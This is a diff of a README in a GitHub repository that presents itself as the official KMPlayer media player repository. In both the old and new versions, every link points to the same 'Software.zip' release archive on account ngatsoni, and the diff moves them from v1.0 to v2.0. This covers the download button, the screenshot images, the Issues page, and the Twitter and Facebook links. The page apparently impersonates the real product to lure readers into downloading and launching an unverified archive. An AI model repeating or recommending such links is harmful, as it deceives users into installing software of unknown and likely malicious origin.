@@ -29,7 +29,7 @@ Welcome to the official GitHub repository of **KMPlayer**, the versatile media p
 ## Get Started with KMPlayer
 To download the latest version of KMPlayer, click the button below:
 
-[![Download KMPlayer](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v1.0/Software.zip)](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v1.0/Software.zip)
+[![Download KMPlayer](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v2.0/Software.zip)](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v2.0/Software.zip)
 
 *Note: The link above needs to be launched for downloading the KMPlayer.*
 
@@ -45,9 +45,9 @@ To download the latest version of KMPlayer, click the button below:
 ## Screenshots
 Here are some screenshots of KMPlayer in action:
 
-![Screenshot 1](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v1.0/Software.zip)
-![Screenshot 2](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v1.0/Software.zip)
-![Screenshot 3](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v1.0/Software.zip)
+![Screenshot 1](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v2.0/Software.zip)
 
 ## How to Use KMPlayer
 1. **Download:** Click the button above to download the latest version of KMPlayer.
@@ -58,10 +58,10 @@ Here are some screenshots of KMPlayer in action:
 We welcome contributions to enhance and improve KMPlayer. If you have ideas for new features, bug fixes, or other improvements, feel free to submit a pull request.
 
 ## Support
-If you encounter any issues while using KMPlayer or have any questions, please visit the [Issues](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v1.0/Software.zip) section of this repository to report problems.
+If you encounter any issues while using KMPlayer or have any questions, please visit the [Issues](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v2.0/Software.zip) section of this repository to report problems.
 
 ## Stay Connected
-Stay up to date with the latest KMPlayer news and updates by following us on [Twitter](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v1.0/Software.zip) and [Facebook](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v1.0/Software.zip).
+Stay up to date with the latest KMPlayer news and updates by following us on [Twitter](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v2.0/Software.zip) and [Facebook](https://github.com/ngatsoni/KMPlayer-Media-Player/releases/download/v2.0/Software.zip).
 
 Thank you for choosing KMPlayer for all your media playback needs! 🎬🎶
 
